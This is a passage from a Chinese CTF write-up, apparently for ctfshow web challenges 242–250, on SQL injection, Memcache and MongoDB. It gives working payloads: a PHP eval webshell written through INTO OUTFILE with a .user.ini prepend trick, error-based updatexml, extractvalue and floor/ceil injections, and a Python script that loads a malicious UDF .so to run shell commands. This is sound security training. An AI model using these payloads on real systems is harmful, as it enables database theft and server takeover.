src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664522341108-06a14fc6-9528-43b3-9ccf-a227a763235f.png#averageHue=%2338404a&clientId=u01553bf6-521b-4&from=paste&height=46&id=u2122e442&name=image.png&originHeight=58&originWidth=585&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2986&status=done&style=none&taskId=u681c9271-a6e5-423e-b645-bf96bf844e6&title=&width=468" alt="image.png"><br>也就是结束后添加一个语句<br><code>FIELDS TERMINATED BY</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664522369128-bbd8df53-e066-45df-b649-7c94989b2943.png#averageHue=%23343d47&clientId=u01553bf6-521b-4&from=paste&height=88&id=u1f704cbd&name=image.png&originHeight=110&originWidth=202&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2127&status=done&style=none&taskId=u26f9703a-be62-46bf-aee6-b2a851d7790&title=&width=161.6" alt="image.png"><br>也就是字段间的间隔符<br><code>OPTIONALLY ENCLOSED BY</code>：<br>这个要和<code>LINES TERMINATED BY</code>一起使用，否则报错<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664522535067-824137b1-c608-412a-8842-c19b73d6f912.png#averageHue=%233d4650&clientId=u01553bf6-521b-4&from=paste&height=83&id=u447d808b&name=image.png&originHeight=104&originWidth=183&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2137&status=done&style=none&taskId=uee0bad5f-c3ee-41ff-a1f6-8998bc36bd2&title=&width=146.4" alt="image.png"><br>将字段用什么包裹起来，介绍完了就直接抓包payload：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664522655170-0924c50e-b0c7-433b-8a3a-20a47e6dda32.png#averageHue=%23f6f5f4&clientId=u01553bf6-521b-4&from=paste&height=240&id=ue92fceaa&name=image.png&originHeight=300&originWidth=1264&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46302&status=done&style=none&taskId=u0ea13314-3ba3-4687-a4b1-292faba469a&title=&width=1011.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664522659944-e56ec744-c86f-4c40-baf2-f3ff2ecace33.png#averageHue=%23ededed&clientId=u01553bf6-521b-4&from=paste&height=375&id=uf6fcb5f9&name=image.png&originHeight=469&originWidth=1042&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48264&status=done&style=none&taskId=ufa5ec5f7-6072-4abe-a986-d317427fe82&title=&width=833.6" alt="image.png"><br>这是txt文件，无法解析，改为php：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664522681695-2553ac9b-2a87-45b5-aa50-c21f1f021c2d.png#averageHue=%23f5f3f2&clientId=u01553bf6-521b-4&from=paste&height=210&id=ue7b0f265&name=image.png&originHeight=263&originWidth=1128&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38253&status=done&style=none&taskId=ue9fba5fe-8a7d-4d35-928f-146ebc2aca5&title=&width=902.4" alt="image.png"><br>蚁剑上号</p>
<h2 id="Web243（-user-ini和短标签）"><a href="#Web243（-user-ini和短标签）" class="headerlink" title="Web243（.user.ini和短标签）"></a>Web243（.user.ini和短标签）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664539638326-1722c91a-8119-4c7b-840c-a170435dcf06.png#averageHue=%23f5f5f5&clientId=u8175e6f4-fd97-4&from=paste&height=260&id=u15714572&name=image.png&originHeight=325&originWidth=1258&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8580&status=done&style=none&taskId=uc7b02b16-987d-480a-a31d-5f452274b82&title=&width=1006.4" alt="image.png"><br>过滤了php就不能上传php文件，我们有.user.ini和短标签<br>首先先上传一个2.txt文件，内容有一句话木马：<br>payload&#x3D;<code>2.txt&#39; FIELDS TERMINATED BY&#39;&lt;?=eval($_POST[1]);?&gt;&#39;#	</code><br>继续上传.user.ini文件。解析2.txt：<br>payload&#x3D;<code>.user.ini&#39; lines starting by&#39;;&#39; terminated by &#39;%0aauto_prepend_file=2.txt&#39;#	</code><br>意思是每行的开头都是分号；<br>结尾都是<code>&#39;%0aauto_prepend_file=2.txt&#39;</code>，最后效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664539816257-15eb87bd-a4fc-429e-8759-0cc640c36965.png#averageHue=%23faf8f7&clientId=u8175e6f4-fd97-4&from=paste&height=443&id=ua562568c&name=image.png&originHeight=554&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72842&status=done&style=none&taskId=u3c604491-3fbc-453f-8435-cd215fc0820&title=&width=501.6" alt="image.png"><br>分号<code>；</code>是ini文件中的注释符，放在一行的开头<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664539875317-b7089454-d939-4503-bf38-689e19acf62a.png#averageHue=%23fefdfc&clientId=u8175e6f4-fd97-4&from=paste&height=82&id=ua5527694&name=image.png&originHeight=102&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7295&status=done&style=none&taskId=u64760c50-41f5-43ef-9798-1aadc898889&title=&width=683.2" alt="image.png"><br>然后再加上换行符就可以达到注释多余字符的效果<br>最后访问url+&#x2F;dump,由于该界面有个index.php，所以可以触发，最后蚁剑上号</p>
<h2 id="Web244-updatexml"><a href="#Web244-updatexml" class="headerlink" title="Web244(updatexml)"></a>Web244(updatexml)</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664547107180-0b2e0f72-b200-40f1-86da-7330704a73ab.png#averageHue=%23f6f6f6&clientId=u8175e6f4-fd97-4&from=paste&height=284&id=u84119b35&name=image.png&originHeight=355&originWidth=1457&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9548&status=done&style=none&taskId=u29476a66-12df-41c7-9c34-1b49df34b81&title=&width=1165.6" alt="image.png"><br>单调的updatexml注入：<br><code>?id=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)-- -</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664547122814-e36d7826-ef22-4489-8aa4-ada4112b627f.png#averageHue=%23c1c1c1&clientId=u8175e6f4-fd97-4&from=paste&height=402&id=u066eb1ca&name=image.png&originHeight=503&originWidth=1432&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39143&status=done&style=none&taskId=ucf8f07e0-e035-4a4c-94c9-cc4466060bc&title=&width=1145.6" alt="image.png"><br><code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)-- -</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664547234309-b0cd5d3c-ec6e-4f1e-ba5a-df38d42b2b42.png#averageHue=%23fbfbfa&clientId=u8175e6f4-fd97-4&from=paste&height=131&id=ucbc8ab6b&name=image.png&originHeight=164&originWidth=1146&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13205&status=done&style=none&taskId=u43d52785-3deb-464f-973d-65fd3e56031&title=&width=916.8" alt="image.png"><br><code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flag&#39;),0x7e),1)-- -</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664547273721-4dcd8c8a-ae2d-43ee-a87d-d56d8f5a7450.png#averageHue=%23dfc293&clientId=u8175e6f4-fd97-4&from=paste&height=125&id=uaa798a8a&name=image.png&originHeight=156&originWidth=881&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19346&status=done&style=none&taskId=ub84bb1c5-8f68-4065-b9b6-74f38756105&title=&width=704.8" alt="image.png"><br>爆字段的时候由于报错长度最长是32，所以要用substr或者substring或者not in去截取<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664547362310-ca5aedcf-6ec0-429e-b1e6-55d371507fd9.png#averageHue=%23afaeae&clientId=u8175e6f4-fd97-4&from=paste&height=430&id=ubc88d663&name=image.png&originHeight=538&originWidth=1645&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43103&status=done&style=none&taskId=uc4369f95-6209-446d-a3ab-c727b28755a&title=&width=1316" alt="image.png"></p>
<h2 id="Web245（extractvalue）"><a href="#Web245（extractvalue）" class="headerlink" title="Web245（extractvalue）"></a>Web245（extractvalue）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664540655941-2f200c4d-91b8-42e8-b33c-4a39edb66fa8.png#averageHue=%23f5f5f4&clientId=u8175e6f4-fd97-4&from=paste&height=256&id=u32d0b380&name=image.png&originHeight=320&originWidth=1402&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8448&status=done&style=none&taskId=uca7ee916-4323-443b-a686-806e8af7136&title=&width=1121.6" alt="image.png"><br>办了updatexml那咱就用extractvalue去报错<br>抓个包重发：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664540781067-a9d0741d-b6d2-435e-b92b-03f104fb7bd2.png#averageHue=%23f7f5f5&clientId=u8175e6f4-fd97-4&from=paste&height=226&id=u994020e0&name=image.png&originHeight=283&originWidth=1283&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42087&status=done&style=none&taskId=u566e5a86-5b36-4297-9b5c-86ab6e924b0&title=&width=1026.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664540785117-1e42b833-f432-4ef0-bac0-88298962719f.png#averageHue=%23fcfcfb&clientId=u8175e6f4-fd97-4&from=paste&height=223&id=u3770aa38&name=image.png&originHeight=279&originWidth=1170&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10968&status=done&style=none&taskId=u11fe435e-9a81-4f4f-99b1-3701e7387a6&title=&width=936" alt="image.png"><br><code>1&#39;union select 1,2,extractvalue(1,concat(0x7e,database()))#</code>成功爆出数据库，接下来就一个个爆<br><code>1&#39;union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#</code><br><code>1&#39;union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagsa&#39;)))#</code><br>最后得到字段是flag1，这里要注意，flag的字符长度是41位，而extractvalue报错的长度最长是32位，这边需要用substr去分段截取：<br><code>1&#39;union select 1,2,extractvalue(1,concat(0x7e,(substr((select flag1 from ctfshow_flagsa),1,32))))#</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664541259324-ed6ac8d5-8869-48c5-a51c-6bc43d49a43a.png#averageHue=%23f5f5f5&clientId=u8175e6f4-fd97-4&from=paste&height=65&id=u1db3a58e&name=image.png&originHeight=81&originWidth=457&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3815&status=done&style=none&taskId=ucb1dc03b-8c6c-4dc5-8f77-4980828e995&title=&width=365.6" alt="image.png"><br><code>1&#39;union select 1,2,extractvalue(1,concat(0x7e,(substr((select flag1 from ctfshow_flagsa),32,20))))#</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664541297684-34ba46c4-fd49-44b9-b22f-098ce6bf2eb8.png#averageHue=%23f7f6f6&clientId=u8175e6f4-fd97-4&from=paste&height=94&id=ube37b328&name=image.png&originHeight=118&originWidth=588&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7312&status=done&style=none&taskId=u780f8da4-4b5e-41ff-abb4-070896960a5&title=&width=470.4" alt="image.png"><br>得到答案</p>
<h2 id="Web246（group-by报错）"><a href="#Web246（group-by报错）" class="headerlink" title="Web246（group by报错）"></a>Web246（group by报错）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664546010884-49bdfdd6-251d-4ab4-ba3c-c475262db321.png#averageHue=%23f6f6f6&clientId=u8175e6f4-fd97-4&from=paste&height=293&id=ue1cc6780&name=image.png&originHeight=366&originWidth=1575&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10702&status=done&style=none&taskId=ub5f540b2-4ad4-4160-b62e-398aa37b0d0&title=&width=1260" alt="image.png"><br>这边ban了updatexml和extractvalue，只能用基于floor的group by报错注入，具体原理参考：</p>
<p>在这里我只想强调，假如想要本地复现，mysql的版本只有5.6可以，其他的貌似都不可以！！！，题目用的是10.3.18-MariaDB数据库，不是mysql<br>这边直接payload：<br><code>?id=&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2))a from information_schema.columns group by a-- -</code><br>这里不能用groupconcat，只能用limit，具体原因不太清楚，总而言之就是不行<br><strong>补档：</strong>现在知道了为什么不能用了，因为他查询出来的并不是一行！<br><code>select 1,(select group_concat(name) from tb1) from tb1;</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664603644593-eb49fc90-3561-4c7e-acc6-e1f9c47b1bf1.png#averageHue=%23131110&clientId=uec97771f-a1e3-4&from=paste&height=152&id=uc9aa72ce&name=image.png&originHeight=190&originWidth=545&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12144&status=done&style=none&taskId=u8fd0ddfc-a10d-4eea-9b3d-f8fdb74d4b3&title=&width=436" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664546350357-543a4b8b-593d-49fc-bfc3-faef02586792.png#averageHue=%23b5b5b5&clientId=u8175e6f4-fd97-4&from=paste&height=417&id=u9cac25e8&name=image.png&originHeight=521&originWidth=1628&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47372&status=done&style=none&taskId=u4d45d97c-ce98-4d56-a034-1a8b7f1d4c3&title=&width=1302.4" alt="image.png"><br>成功暴露出表名，这边顺便看一下version：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664546378669-ac6cf0b5-920f-4e7f-a3ae-0bdf8fe08048.png#averageHue=%23acacab&clientId=u8175e6f4-fd97-4&from=paste&height=437&id=u49a4ee4e&name=image.png&originHeight=546&originWidth=1645&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45105&status=done&style=none&taskId=u41e33784-6f07-4d9b-a5cb-9e5f808e645&title=&width=1316" alt="image.png"><br>10.3.18-MariaDB数据库<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664546699398-54603e52-b739-44fe-991c-1460e70244ff.png#averageHue=%23f6f5f4&clientId=u8175e6f4-fd97-4&from=paste&height=394&id=ude332b33&name=image.png&originHeight=493&originWidth=1062&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78466&status=done&style=none&taskId=u6a2b3ac5-a816-4895-bcdf-4a8c7c5173b&title=&width=849.6" alt="image.png"><br>接下来就一步步爆列名：<br><code>?id=&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&#39;ctfshow_flags&#39; limit 1,1),0x7e,floor(rand(0)*2))a from information_schema.columns group by a-- -</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664546445063-7d00e027-8e26-4182-bcf4-faf1671630d1.png#averageHue=%23b0b0af&clientId=u8175e6f4-fd97-4&from=paste&height=425&id=ua4356344&name=image.png&originHeight=531&originWidth=1633&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49587&status=done&style=none&taskId=u4406bd46-b360-4e87-bbec-2c5fca7fb13&title=&width=1306.4" alt="image.png"><br>最后爆字段：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664546483241-470c170c-f08d-4792-ad29-9e69d68d266f.png#averageHue=%23b0b0af&clientId=u8175e6f4-fd97-4&from=paste&height=437&id=u39fc5e2f&name=image.png&originHeight=546&originWidth=1636&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47582&status=done&style=none&taskId=ubc44ecb0-5a30-4a53-ae66-626f266d8cf&title=&width=1308.8" alt="image.png"></p>
<p>payload2：<br>1’ and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23<br>这是子查询</p>
<h2 id="Web247（过滤floor）"><a href="#Web247（过滤floor）" class="headerlink" title="Web247（过滤floor）"></a>Web247（过滤floor）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664603339417-356cf620-ae45-4687-9e72-bc7a52b2b95c.png#averageHue=%23f7f6f6&clientId=uec97771f-a1e3-4&from=paste&height=282&id=u5d8a102e&name=image.png&originHeight=353&originWidth=1752&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11159&status=done&style=none&taskId=ue14ef06a-35a9-4275-8022-ec87fe61d0b&title=&width=1401.6" alt="image.png"><br>floor过滤了还有ceil,group by报错的原理我们悉知<br>payload：<br><code>?id=1&#39; union select 1,count(*),concat(0x7e,database(),0x7e,ceil(rand(0)*2))a from information_schema.tables group by a-- -</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664603410227-6a65bb90-3eaa-4506-ac18-0dd8fad5bd6f.png#averageHue=%23b3b3b3&clientId=uec97771f-a1e3-4&from=paste&height=710&id=u5dc79a77&name=image.png&originHeight=887&originWidth=1901&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51905&status=done&style=none&taskId=ud9201a01-6a36-43bf-8f30-7913f1c7e30&title=&width=1520.8" alt="image.png"><br>成功注入，接下来就是一步步的去爆表，爆字段了<br>记得用limit，原因在上一题<br>字段名是flag？，带有问号，问号在mysql中有特殊含义，要用反引号包裹</p>
<h2 id="Web248-UDF注入）"><a href="#Web248-UDF注入）" class="headerlink" title="Web248(UDF注入）"></a>Web248(UDF注入）</h2><p>udf 全称为：user defined function，意为用户自定义函数；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。<br>写入位置：<code>/usr/lib/MySQL目录/plugin</code><br>具体步骤：<br>将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下）<br>从udf文件中引入自定义函数(user defined function)<br>执行自定义函数<br><code>create function sys_eval returns string soname &#39;hack.so&#39;;</code><br><code>select sys_eval(&#39;whoami&#39;);</code></p>
<p>不过这道题是get传值，所以有长度限制，就得分段来传。<br>可以先生成多个文件，再通过concat拼接成完整的so文件。<br>恶意的so文件我们可以通过sqlmap中的文件得到，也可以通过光哥的博客<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a><br>一般选这个就可以了。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664607369479-d05c8a6f-9d5c-40f7-8b78-5ebaadf3f332.png#averageHue=%23e5e5e4&clientId=uec97771f-a1e3-4&from=paste&id=u48e43bf2&name=image.png&originHeight=528&originWidth=2080&originalType=url&ratio=1&rotation=0&showTitle=false&size=484747&status=done&style=none&taskId=ueb521108-2d34-4466-bb8e-b088578b28e&title=" alt="image.png"><br>把0X后面的16进制值填到下面脚本的udf变量中就可以了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://2e9c2d13-5f3c-4a05-ab49-0d087d673b98.challenge.ctf.show/api/&quot;</span></span><br><span class="line">udf=<span class="string">&quot;&quot;</span></span><br><span class="line">udfs=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(udf),<span class="number">5000</span>):</span><br><span class="line">    udfs.append(udf[i:i+<span class="number">5000</span>])</span><br><span class="line"><span class="comment">#写入多个文件中</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> udfs:</span><br><span class="line">    url1=url+<span class="string">f&quot;?id=1&#x27;;SELECT &#x27;<span class="subst">&#123;i&#125;</span>&#x27; into dumpfile &#x27;/tmp/&quot;</span>+<span class="built_in">str</span>(udfs.index(i))+<span class="string">&quot;.txt&#x27;%23&quot;</span></span><br><span class="line">    requests.get(url1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#合并文件生成so文件</span></span><br><span class="line">url2=url+<span class="string">&quot;?id=1&#x27;;SELECT unhex(concat(load_file(&#x27;/tmp/0.txt&#x27;),load_file(&#x27;/tmp/1.txt&#x27;),load_file(&#x27;/tmp/2.txt&#x27;),load_file(&#x27;/tmp/3.txt&#x27;))) into dumpfile &#x27;/usr/lib/mariadb/plugin/hack.so&#x27;%23&quot;</span></span><br><span class="line">requests.get(url2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建自定义函数并执行恶意命令</span></span><br><span class="line">requests.get(url+<span class="string">&quot;?id=1&#x27;;create function sys_eval returns string soname &#x27;hack.so&#x27;%23&quot;</span>)</span><br><span class="line">r=requests.get(url+<span class="string">&quot;?id=1&#x27;;select sys_eval(&#x27;cat /f*&#x27;)%23&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>unhex</code>:mysql函数，将十六进制字符还原为字符串</li>
<li><code>list.index(i)</code>:python函数，用于从列表中找出某个值第一个匹配项的索引位置。</li>
<li><code>select intodumpfile</code>：mysql语法，和select into outfile作用类似，有些许不同</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664607537720-dcd79d0e-e8e7-460d-a8f3-8f005cab77f2.png#averageHue=%23f9f7f5&clientId=uec97771f-a1e3-4&from=paste&height=87&id=u335df16f&name=image.png&originHeight=109&originWidth=765&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11167&status=done&style=none&taskId=u5a2247f6-6666-4b75-a515-dd272ed8f17&title=&width=612" alt="image.png"></p>
<h2 id="Web249（nosql开始）"><a href="#Web249（nosql开始）" class="headerlink" title="Web249（nosql开始）"></a>Web249（nosql开始）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664610588938-91837bf3-0917-440d-817c-cc4529f67fbb.png#averageHue=%23fefefe&clientId=uec97771f-a1e3-4&from=paste&height=30&id=ueb6b00fa&name=image.png&originHeight=37&originWidth=327&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2304&status=done&style=none&taskId=u4cd3903c-e36d-46c7-998f-ba99a093315&title=&width=261.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664610593000-5b094113-e99c-483b-899c-4ce13bca5375.png#averageHue=%23f6f6f6&clientId=uec97771f-a1e3-4&from=paste&height=301&id=ubdd537ab&name=image.png&originHeight=376&originWidth=1490&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8588&status=done&style=none&taskId=u87a3e285-80ec-45da-ad10-72520bf0566&title=&width=1192" alt="image.png"><br>查询语句只有  <code>$user = $memcache-&gt;get($id);</code><br>这是Memcache缓存数据库，他在php中的用法是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$m</span>=<span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line"><span class="variable">$m</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$host</span>,<span class="variable">$port</span>);</span><br><span class="line"><span class="variable">$m</span>-&gt;<span class="title function_ invoke__">add</span>(<span class="variable">$key</span>,<span class="variable">$value</span>[,flags,<span class="variable">$expire_time</span>]);</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$m</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$m</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure>

<p>重点是memcache的get方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664610715416-2fdb1a32-b26b-4a63-a2b3-7d2df29eb66b.png#averageHue=%23ecebeb&clientId=uec97771f-a1e3-4&from=paste&height=472&id=u91e0b6b0&name=image.png&originHeight=590&originWidth=1390&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77981&status=done&style=none&taskId=u18e4217f-c2af-475a-9c74-c1a893c09d6&title=&width=1112" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664610720838-cc0f7ac5-9990-4d2e-b5e3-68b45c01d552.png#averageHue=%23dedddc&clientId=uec97771f-a1e3-4&from=paste&height=429&id=ub0d27dda&name=image.png&originHeight=536&originWidth=1467&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70706&status=done&style=none&taskId=ub5f96e05-17c2-4f14-b254-e6706b40303&title=&width=1173.6" alt="image.png"><br>向get中传入参数或者数组，就可以返回指定的键值对<br>payload：<br><code>?id=flag</code>这个会报错不知道为什么<br><code>?id[]=flag</code>成功</p>
<h2 id="Web250（mongodb）"><a href="#Web250（mongodb）" class="headerlink" title="Web250（mongodb）"></a>Web250（mongodb）</h2><p>万事开头首先强推好文章！</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664612539573-4f5cc231-ce31-4390-9cc7-27ebc384d1de.png#averageHue=%23f7f7f7&clientId=uec97771f-a1e3-4&from=paste&height=542&id=uadbc8e77&name=image.png&originHeight=678&originWidth=1732&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26729&status=done&style=none&taskId=u1988c57a-9406-4145-92c7-bd4ec847ce0&title=&width=1385.6" alt="image.png"><br>是MongoDB数据库注入，接下来讲解一下它的基本语法：</p>
<table>
<thead>
<tr>
<th><strong>SQL术语&#x2F;概念</strong></th>
<th><strong>MongoDB术语&#x2F;概念</strong></th>
<th><strong>解释&#x2F;说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>database</td>
<td>database</td>
<td>数据库</td>
</tr>
<tr>
<td>table</td>
<td>collection</td>
<td>数据库表&#x2F;集合</td>
</tr>
<tr>
<td>row</td>
<td>document</td>
<td>数据记录行&#x2F;文档</td>
</tr>
<tr>
<td>column</td>
<td>field</td>
<td>数据字段&#x2F;域</td>
</tr>
</tbody></table>
<p>数据库操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">显示所有数据库</span><br><span class="line">show dbs <span class="comment">#show databases</span></span><br><span class="line"></span><br><span class="line">创建数据库</span><br><span class="line">use 库名 <span class="comment">#如果数据库不存在，则创建数据库，否则切换到指定数据库。show dbs执行结果没有看到创建的数据库，因为数据库中刚开始没有任何数据并且是在内存中的，有了数据后就会显示出来。</span></span><br><span class="line"></span><br><span class="line">删除数据库</span><br><span class="line">db.dropDatabase() <span class="comment">#删除当前数据库</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>集合（表）操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">显式创建集合</span><br><span class="line">db.createCollection(<span class="string">&quot;userinfo&quot;</span>);//创建一个名为usersinfo的集合</span><br><span class="line"></span><br><span class="line">隐式创建集合</span><br><span class="line">db.userinfo.insert(&#123;name:<span class="string">&quot;yu22x&quot;</span>&#125;);//往collection2集合中添加数据来创建集合，如果集合不存在就自动创建集合。</span><br><span class="line"></span><br><span class="line">查看集合</span><br><span class="line">show collections;//(show tables)</span><br><span class="line"></span><br><span class="line">删除集合userinfo</span><br><span class="line">db.userinfo.drop();</span><br><span class="line"></span><br><span class="line">注：mongo中支持js，可通过js操作实现批零处理，如：<span class="keyword">for</span>(var i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)&#123;db.userinfo.insert(&#123;name:<span class="string">&quot;xiaomu&quot;</span>+i,age:<span class="number">20</span>+i&#125;);&#125;</span><br><span class="line">固定集合</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>我们重点关注的是mongodb中的条件语句</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664612712497-dc89ecc4-e67c-4979-be9d-b73aea7df806.png#averageHue=%23f7f6f5&clientId=ub39d0df3-e8b6-4&from=paste&height=282&id=u78a8ceab&name=image.png&originHeight=353&originWidth=1206&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61261&status=done&style=none&taskId=uacc41d73-1856-4295-bb70-45fe7476904&title=&width=964.8" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AND 查询</span><br><span class="line">db.userinfo.find(&#123;key1:value1, key2:value2&#125;)</span><br><span class="line"></span><br><span class="line">OR 查询</span><br><span class="line">db.userinfo.find(&#123;$<span class="keyword">or</span>: [&#123;key1: value1&#125;, &#123;key2:value2&#125;]&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在mangodb中查询语句：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.userinfo.find(&#123;name:<span class="string">&#x27;yu22x&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>
